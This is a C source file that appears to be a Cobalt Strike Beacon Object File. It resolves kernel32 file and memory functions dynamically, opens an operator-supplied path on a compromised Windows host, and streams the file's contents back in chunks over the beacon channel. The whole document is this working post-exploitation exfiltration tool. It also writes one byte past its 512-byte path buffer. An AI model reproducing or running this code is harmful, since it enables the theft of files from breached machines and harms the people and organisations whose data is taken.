#include <windows.h>

WINBASEAPI HANDLE WINAPI kernel32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
WINBASEAPI BOOL   WINAPI kernel32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
WINBASEAPI BOOL   WINAPI kernel32$CloseHandle(HANDLE);
WINBASEAPI DWORD  WINAPI kernel32$GetFileSize(HANDLE, LPDWORD);
WINBASEAPI DWORD  WINAPI kernel32$GetLastError(VOID);
WINBASEAPI BOOL   WINAPI kernel32$SetFilePointerEx(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD);
WINBASEAPI LPVOID WINAPI kernel32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI BOOL   WINAPI kernel32$VirtualFree(LPVOID, SIZE_T, DWORD);

void BeaconPrintf(int type, char* fmt, ...);
void BeaconOutput(int type, char* data, int len);

#define CALLBACK_OUTPUT  0x0
#define CHUNK_SIZE (64 * 1024)

void go(char* args, int alen) {
    if (!args || alen < 5) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Usage: path_len(4) + path + chunk_size(4)\n");
        return;
    }

    int path_len = *(int*)args;
    if (path_len <= 0 || path_len > 512 || 4 + path_len + 4 > alen) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Invalid path length\n");
        return;
    }

    char path[512];
    for (int i = 0; i < path_len && i < 511; i++) path[i] = args[4 + i];
    path[path_len] = '\0';

    DWORD chunk_size = *(DWORD*)(args + 4 + path_len);
    if (chunk_size == 0 || chunk_size > CHUNK_SIZE) chunk_size = CHUNK_SIZE;

    HANDLE hFile = kernel32$CreateFileA(
        path, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CreateFileA failed: %lu\n", kernel32$GetLastError());
        return;
    }

    char* buffer = (char*)kernel32$VirtualAlloc(NULL, chunk_size, MEM_COMMIT, PAGE_READWRITE);
    if (!buffer) {
        kernel32$CloseHandle(hFile);
        BeaconPrintf(CALLBACK_OUTPUT, "[!] VirtualAlloc failed\n");
        return;
    }

    for (;;) {
        DWORD bytesRead = 0;
        if (!kernel32$ReadFile(hFile, buffer, chunk_size, &bytesRead, NULL)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] ReadFile failed: %lu\n", kernel32$GetLastError());
            break;
        }
        if (bytesRead == 0) break;

        BeaconOutput(CALLBACK_OUTPUT, buffer, bytesRead);

        if (bytesRead < chunk_size) break;
    }

    kernel32$VirtualFree(buffer, 0, MEM_RELEASE);
    kernel32$CloseHandle(hFile);
}
